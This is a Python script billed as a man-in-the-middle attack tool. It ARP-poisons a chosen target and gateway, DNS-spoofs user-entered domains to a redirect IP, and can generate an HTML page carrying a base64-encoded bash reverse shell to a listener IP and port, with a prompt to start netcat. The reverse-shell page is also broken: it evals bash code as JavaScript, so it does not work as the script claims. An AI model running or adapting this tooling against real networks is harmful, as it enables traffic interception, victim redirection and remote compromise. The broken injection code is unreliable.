#!/usr/bin/env python3

import os
import sys
import subprocess
import base64
from time import sleep, time
from datetime import datetime
import re

class Colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    RESET = "\033[0m"

def print_logo():
    logo = [
        f"{Colors.RED}    ▄▄▄▄▄▄▄  ▄▄▄▄  ▄▄    ▄▄▄▄▄▄▄    {Colors.RESET}",
        f"{Colors.YELLOW}   █  ▄    █    █  █ █  █       █   {Colors.RESET}",
        f"{Colors.GREEN}   █ █▄█   █    █   █▄█ █▄     ▄█   {Colors.RESET}",
        f"{Colors.CYAN}   █       █    █       █ █   █     {Colors.RESET}",
        f"{Colors.BLUE}   █  ▄   ███  █  ▄    █  █ █      {Colors.RESET}",
        f"{Colors.MAGENTA}   █ █▄█     █ █ █ █   █   █       {Colors.RESET}",
        f"{Colors.RED}   █▄▄▄▄▄▄▄▄▄█ █▄█  █▄▄█   █       {Colors.RESET}",
        f"{Colors.YELLOW}      ▀▀ ▀▀▀             ▀▀▀        {Colors.RESET}",
        f"{Colors.RED}    [×]══════[ {Colors.GREEN}MITM{Colors.RED} ]══════[×]    {Colors.RESET}",
        f"{Colors.BLUE}         ┌─────────────┐{Colors.RESET}",
        f"{Colors.GREEN}      ┌──┤ INTERCEPTOR ├──┐{Colors.RESET}",
        f"{Colors.RED}      │  └─────────────┘  │{Colors.RESET}",
        f"{Colors.YELLOW}   [Client] ⚡ ☠ ⚡ [Server]{Colors.RESET}",
        f"{Colors.RED}      ▀   {Colors.GREEN}⚔ ☢ ⚔{Colors.RED}   ▀{Colors.RESET}",
        f"{Colors.BLUE}     ⚝ DNS SPOOFER ACTIVE ⚝{Colors.RESET}",
        f"{Colors.RED}    ⚠ PACKET INJECTION ⚠{Colors.RESET}",
        f"{Colors.GREEN}   《 ARP POISONING READY 》{Colors.RESET}",
        f"{Colors.MAGENTA}    ∴∵∴∵∴∵∴∵∴∵∴∵∴∵∴∵∴{Colors.RESET}",
        f"{Colors.CYAN}   ∆ R E V E R S E  S H E L L  ∆  {Colors.RESET}"
    ]
    for line in logo:
        print(line)
        sleep(0.1)

def print_menu():
    print(f"{Colors.GREEN}+{'-'*50}+")
    print(f"| {Colors.CYAN}MAN-IN-THE-MIDDLE ATTACK SCRIPT{Colors.GREEN} {' '*17} |")
    print(f"+{'-'*50}+")
    print(f"{Colors.YELLOW}| 1 | Start Attack{' '*35}|")
    print(f"{Colors.BLUE}| 2 | Restore Settings{' '*31}|")
    print(f"{Colors.RED}| 3 | Exit{' '*43}|")
    print(f"{Colors.GREEN}+{'-'*50}+{Colors.RESET}")

def check_dependencies():
    tools = ["arpspoof", "dnsspoof"]
    for tool in tools:
        if subprocess.call(["which", tool], stdout=subprocess.PIPE, stderr=subprocess.PIPE) != 0:
            print(f"{Colors.RED}[-] Error: {tool} is not installed. Install 'dsniff' package.{Colors.RESET}")
            sys.exit(1)
    print(f"{Colors.GREEN}[+] All dependencies installed.{Colors.RESET}")

def get_network_interface():
    interfaces = subprocess.check_output(["ip", "link", "show"], text=True).splitlines()
    print(f"{Colors.YELLOW}[?] Available interfaces:{Colors.RESET}")
    for idx, iface in enumerate(interfaces, 1):
        print(f"{idx}. {iface.split(':')[1].strip()}")
    choice = int(input(f"{Colors.YELLOW}[?] Select interface number: {Colors.RESET}"))
    return interfaces[choice-1].split(':')[1].strip()

def is_valid_ip(ip):
    pattern = r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$"
    return re.match(pattern, ip) and all(0 <= int(x) <= 255 for x in ip.split("."))

def is_valid_domain(domain):
    pattern = r"^([a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}$"
    return re.match(pattern, domain.strip()) is not None

def enable_port_forwarding():
    print(f"{Colors.BLUE}[*] Enabling port forwarding...{Colors.RESET}")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print(f"{Colors.GREEN}[+] Port forwarding enabled.{Colors.RESET}")

def start_arp_spoof(target_ip, gateway_ip, interface):
    print(f"{Colors.BLUE}[*] Starting ARP spoofing on {interface}...{Colors.RESET}")
    arp_process = subprocess.Popen(["arpspoof", "-i", interface, "-t", target_ip, gateway_ip], stderr=subprocess.PIPE)
    sleep(2)
    if arp_process.poll() is not None:
        error = arp_process.stderr.read().decode()
        print(f"{Colors.RED}[-] ARP spoofing failed: {error}{Colors.RESET}")
        sys.exit(1)
    print(f"{Colors.GREEN}[+] ARP spoofing started.{Colors.RESET}")
    return arp_process

def start_dns_spoof(hosts_file, interface):
    print(f"{Colors.BLUE}[*] Starting DNS spoofing...{Colors.RESET}")
    with open("dns_spoof.log", "a") as log:
        dns_process = subprocess.Popen(["dnsspoof", "-i", interface, "-f", hosts_file], stdout=log, stderr=subprocess.PIPE)
    sleep(2)
    if dns_process.poll() is not None:
        error = dns_process.stderr.read().decode()
        print(f"{Colors.RED}[-] DNS spoofing failed: {error}{Colors.RESET}")
        sys.exit(1)
    print(f"{Colors.GREEN}[+] DNS spoofing started. Logging to dns_spoof.log{Colors.RESET}")
    return dns_process

def create_hosts_file(domains, redirect_ip):
    with open("hosts.txt", "w") as f:
        for domain in domains:
            f.write(f"{redirect_ip} {domain.strip()}\n")
    print(f"{Colors.GREEN}[+] Hosts file created.{Colors.RESET}")

def create_injection_file(listener_ip, listener_port):
    cmd = f"bash -i >& /dev/tcp/{listener_ip}/{listener_port} 0>&1"
    encoded_cmd = base64.b64encode(cmd.encode()).decode()
    injection_html = f"""
    <html>
    <body>
    <script>
        eval(atob('{encoded_cmd}'));
        setTimeout(function() {{ window.location = 'http://example.com'; }}, 1000);
    </script>
    </body>
    </html>
    """
    if os.path.exists("injected.html"):
        overwrite = input(f"{Colors.YELLOW}[?] 'injected.html' already exists. Overwrite? (y/n): {Colors.RESET}").lower()
        if overwrite != "y":
            print(f"{Colors.RED}[-] Injection file creation skipped.{Colors.RESET}")
            return
    with open("injected.html", "w") as f:
        f.write(injection_html)
    print(f"{Colors.GREEN}[+] Injected HTML file created as 'injected.html'. Serve it on {listener_ip}.{Colors.RESET}")

def log_attack(target_ip, gateway_ip, redirect_ip, domains):
    with open("mitm_log.txt", "a") as f:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        f.write(f"[{timestamp}] Target: {target_ip}, Gateway: {gateway_ip}, Redirect: {redirect_ip}, Domains: {','.join(domains)}\n")
    print(f"{Colors.GREEN}[+] Attack logged to mitm_log.txt{Colors.RESET}")

def print_attack_summary(target_ip, gateway_ip, redirect_ip, domains):
    print(f"{Colors.GREEN}+{'-'*50}+")
    print(f"| {Colors.CYAN}Attack Summary{Colors.GREEN} {' '*35} |")
    print(f"+{'-'*50}+")
    print(f"| Target IP    | {target_ip:<35} |")
    print(f"| Gateway IP   | {gateway_ip:<35} |")
    print(f"| Redirect IP  | {redirect_ip:<35} |")
    print(f"| Domains      | {', '.join(domains):<35} |")
    print(f"+{'-'*50}+{Colors.RESET}")

def restore_settings(arp_process, dns_process):
    print(f"{Colors.BLUE}[*] Restoring settings...{Colors.RESET}")
    if arp_process: arp_process.terminate()
    if dns_process: dns_process.terminate()
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print(f"{Colors.GREEN}[+] Settings restored.{Colors.RESET}")

def main():
    print_logo()
    check_dependencies()
    interface = get_network_interface()
    while True:
        print_menu()
        choice = input(f"{Colors.YELLOW}[?] Enter your choice: {Colors.RESET}")

        if choice == "1":
            target_ip = input(f"{Colors.YELLOW}[?] Enter target IP: {Colors.RESET}")
            gateway_ip = input(f"{Colors.YELLOW}[?] Enter gateway IP: {Colors.RESET}")
            redirect_ip = input(f"{Colors.YELLOW}[?] Enter redirect IP: {Colors.RESET}")
            domains = input(f"{Colors.YELLOW}[?] Enter domains to spoof (comma separated): {Colors.RESET}").split(",")

            if not all([is_valid_ip(target_ip), is_valid_ip(gateway_ip), is_valid_ip(redirect_ip)]):
                print(f"{Colors.RED}[-] Invalid IP address entered.{Colors.RESET}")
                continue
            if not all(is_valid_domain(domain) for domain in domains):
                print(f"{Colors.RED}[-] Invalid domain entered.{Colors.RESET}")
                continue

            # Reverse shell opció
            inject_choice = input(f"{Colors.YELLOW}[?] Inject reverse shell? (y/n): {Colors.RESET}").lower()
            listener_ip = None
            listener_port = None
            if inject_choice == "y":
                listener_ip = input(f"{Colors.YELLOW}[?] Enter listener IP for reverse shell: {Colors.RESET}")
                listener_port = input(f"{Colors.YELLOW}[?] Enter listener port: {Colors.RESET}")
                if not is_valid_ip(listener_ip) or not listener_port.isdigit():
                    print(f"{Colors.RED}[-] Invalid listener IP or port.{Colors.RESET}")
                    continue
                create_injection_file(listener_ip, listener_port)

            enable_port_forwarding()
            create_hosts_file(domains, redirect_ip)
            log_attack(target_ip, gateway_ip, redirect_ip, domains)
            print_attack_summary(target_ip, gateway_ip, redirect_ip, domains)
            arp_process = start_arp_spoof(target_ip, gateway_ip, interface)
            dns_process = start_dns_spoof("hosts.txt", interface)

            print(f"{Colors.GREEN}[+] Attack started! Press Ctrl+C to stop.{Colors.RESET}")
            if inject_choice == "y":
                print(f"{Colors.YELLOW}[*] Start a listener on {listener_ip}:{listener_port} (e.g., 'nc -lvnp {listener_port}'){Colors.RESET}")
            start_time = time()
            try:
                while True:
                    elapsed = int(time() - start_time)
                    print(f"{Colors.MAGENTA}[*] Attack running... (Target: {target_ip}) [Time: {elapsed}s]{Colors.RESET}", end="\r")
                    sleep(1)
            except KeyboardInterrupt:
                restore_settings(arp_process, dns_process)

        elif choice == "2":
            restore_settings(None, None)

        elif choice == "3":
            print(f"{Colors.RED}[*] Exiting...{Colors.RESET}")
            sys.exit(0)

        else:
            print(f"{Colors.RED}[-] Invalid choice!{Colors.RESET}")

if __name__ == "__main__":
    main()
